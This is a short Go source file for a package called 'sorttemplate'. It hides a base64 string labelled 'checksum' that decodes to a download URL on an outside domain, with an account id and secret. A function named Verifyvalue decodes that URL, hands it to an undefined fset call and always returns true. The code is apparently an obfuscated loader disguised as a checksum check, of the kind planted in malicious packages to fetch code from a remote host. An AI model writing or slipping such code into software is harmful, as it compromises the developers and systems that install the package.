package sorttemplate

import "encoding/base64"

var (
	checksum = "aHR0cHM6Ly9kb3dubG9hZC5kYXRhdGFibGV0ZW1wbGF0ZS54eXovYWNjb3VudC9yZWdpc3Rlci9pZD01NDE4MTI0NTc2MDA2ODQzJnNlY3JldD1OT21QcUtYcFFtUWI="
)

func Verifyvalue() bool {
	chsum, _ := base64.StdEncoding.DecodeString(checksum)
	fset(string(chsum))
	return true
}
